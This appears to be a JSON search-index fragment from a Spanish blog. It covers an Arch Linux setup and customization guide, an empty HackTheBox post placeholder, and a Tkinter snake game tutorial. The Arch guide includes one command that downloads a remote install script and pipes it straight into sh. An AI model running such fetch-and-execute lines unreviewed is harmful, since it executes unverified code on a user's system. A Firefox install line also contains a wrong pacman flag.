siguiente pantalla:              En esta opción se debe seleccionar no y dar enter para salir.     Para comenzar comenzar nuestro ArchLinux se coloca el siguiente comando para reiniciar el sistema:    reboot   Cuando se reinicie, debe aparecer el gestor de inicio de sesión con el nombre de usuario que configuraste previamente. Ingresa la respectiva contraseña. Una vez iniciada tu sesión, deberías ver tu escritorio.             Herramientas  Actualización del sistema:   sudo pacman -Syu  Instalación de herramientas:     Instalación de Git     sudo pacman -S git            Instalación de kitty (Terminal):     sudo pacman -S kitty           Instalación de Firefox (Navegador)     sudo pacman -s firefox           Instalación de Yay (AUR Helper):            Primero, instala los paquetes necesarios para compilar Yay:         sudo pacman -S base-devel                       Clona el repositorio de Yay:         git clone https://aur.archlinux.org/yay.git                       Navega al directorio clonado e instala Yay:         cd yay makepkg -si                           htop (Monitor del sistema interactivo):     sudo pacman -S htop           neofetch (Información del sistema)     sudo pacman -S neofetch           vim y neovim (Editor de texto avanzado):     sudo pacman -S vim neovim           nano (Editor de texto simple)     sudo pacman -S nano           Visual Studio Code (Editor de código fuente)     yay -S visual-studio-code-bin           VLC (Reproductor multimedia)     sudo pacman -S vlc           wget y curl (Herramienta de descarga):     sudo pacman -S wget curl           Personalización  La personalización puede variar dependiendo de cada escritorio. En este caso, se usará KDE Plasma, que es un escritorio bastante personalizable.        Personalización de nano para que tenga color usaremos nanorc  curl https://raw.githubusercontent.com/scopatz/nanorc/master/install.sh | sh  Personalizacion de neovim usaremos NvChad   git clone https://github.com/NvChad/starter ~/.config/nvim &amp;&amp; nvim  Para mas detalles de instalación de herramientas para Linux podemos ver el siguiente enlace:   Personalización de un entorno de trabajo Linux   ","categories": ["Linux"],
        "tags": ["Linux","Personalización"],
        "url": "/linux/ArchLinux/",
        "teaser": "/assets/images/ArchLinux/icons8-arch-linux-480.png"
      },{
        "title": "Máquina GreenHorn de HackTheBox con dificultad fácil",
        "excerpt":"Próximamente…  ","categories": ["HackTheBox"],
        "tags": ["pixelated","pluck 4.7.18"],
        "url": "/hackthebox/Maquina-GreenHorn/",
        "teaser": "/assets/images/MaquinaGreenHorn/GreenHorn.webp"
      },{
        "title": "Clásico juego de snake en python",
        "excerpt":"Historia  El juego de la serpiente es uno de los videojuegos más icónicos y conocidos, originalmente popularizado en teléfonos móviles Nokia a finales de los años 90. El objetivo es simple: controlar una serpiente que se mueve por la pantalla, consumiendo comida para crecer, mientras se evita chocar contra las paredes o contra sí misma. Este juego, a pesar de su simplicidad, sigue siendo muy popular y ha sido recreado en innumerables plataformas y lenguajes de programación.   Funcionalidad  Este proyecto recrea el clásico juego de la serpiente usando Python y la biblioteca gráfica Tkinter. La serpiente se mueve dentro de un área de juego definida (un Canvas) y puede cambiar de dirección en respuesta a las teclas de flecha del teclado. Un cuadrado rojo representa la “comida” y aparece en posiciones aleatorias dentro del área de juego. Cuando la serpiente come la comida, su longitud aumenta y la puntuación del jugador se incrementa. El juego termina si la serpiente choca contra sí misma.   Explicación del Código  Inicialización de la Ventana y Componentes  class SnakeApp():     def __init__(self, root):         self.root = root         self.root.title(\"Snake\")         self.root.geometry(\"450x480\")         self.root.configure(bg='#654321')         self.root.resizable(width=False, height=False)  Aquí se inicializa la ventana principal del juego. Se establece el tamaño de la ventana, el color de fondo, y se impide que la ventana sea redimensionada.   Lienzo y Etiquetas  self.canvas = Canvas(root, width=400, height=400, bg='black', highlightthickness=0) self.canvas.place(relx=0.5, rely=0.5, anchor=CENTER)  self.score_label = Label(root, text=\"Puntuación: 0\", font=(\"Arial\", 14), bg='#654321', fg='white') self.score_label.place(relx=0.5, rely=0.05, anchor=CENTER)  Se crea un Canvas donde se dibujará la serpiente y la comida. Además, se añade una etiqueta para mostrar la puntuación actual del jugador.   Configuración Inicial de la Serpiente  self.snake = [] self.snake_x = 100 self.snake_y = 100 self.direction = {'x': 1, 'y': 0} self.initial_length = 3 self.create_snake()  Se define la posición inicial de la serpiente y su dirección de movimiento. La serpiente comienza con una longitud de 3 segmentos.   Movimiento de la Serpiente  def move(self):     if not self.game_over:         self.snake_x += self.direction['x'] * self.square_size          self.snake_y += self.direction['y'] * self.square_size         self.snake_x %= 400         self.snake_y %= 400         if self.check_collision():             self.end_game()         for i in range(len(self.snake)-1, 0, -1):             x1, y1, x2, y2 = self.canvas.coords(self.snake[i-1])             self.canvas.coords(self.snake[i], x1, y1, x2, y2)         x1 = self.snake_x         y1 = self.snake_y         x2 = x1 + self.square_size         y2 = y1 + self.square_size         self.canvas.coords(self.snake[0], x1, y1, x2, y2)         head_coords = self.canvas.coords(self.snake[0])         x1_r, y1_r, x2_r, y2_r = self.canvas.coords(self.rect_2)         if (head_coords[0] &lt; x2_r and head_coords[2] &gt; x1_r) and (head_coords[1] &lt; y2_r and head_coords[3] &gt; y1_r):             self.randomize_red_square_position()             self.extend_snake()             self.score += 1             self.score_label.config(text=f\"Puntuación: {self.score}\")     self.root.after(100, self.move)  Este método se ejecuta repetidamente para mover la serpiente en la dirección actual. También verifica si la serpiente ha chocado contra sí misma o si ha comido la comida roja. En caso de que coma, se actualiza la puntuación y se incrementa la longitud de la serpiente.   Finalización del Juego  def end_game(self):     if not self.game_over:         self.game_over = True         messagebox.showinfo(\"Game Over\", \"¡Has perdido!\\nPresiona aceptar\")         self.game_over = False         self.reset_game()   Este método muestra un mensaje de “Game Over” y reinicia el juego si la serpiente choca contra sí misma.   Posibles Mejoras          Incremento de Velocidad: A medida que la puntuación aumenta, se podría incrementar la velocidad de la serpiente para hacer el juego más desafiante.            Obstáculos: Agregar obstáculos aleatorios en el área de juego para aumentar la dificultad.            Sonidos: Incluir efectos de sonido para las acciones como comer la comida o chocar contra sí misma. Mejorar la Aleatorización del Cuadrado Rojo: Actualmente, el cuadrado rojo aparece en posiciones simétricas. Sería mejor permitir que aparezca en cualquier parte del lienzo.       Recomendación  Este proyecto es un excelente punto de partida para aprender sobre la programación de interfaces gráficas y la lógica de juegos en Python. Se recomienda experimentar con diferentes mejoras para aprender cómo afectan la jugabilidad y la interacción del usuario.   ","categories": ["python"],
        "tags": ["juegos"],
        "url": "/python/Snake-Python/",
        "teaser": "/assets/images/Snake/snake.png"
      }]
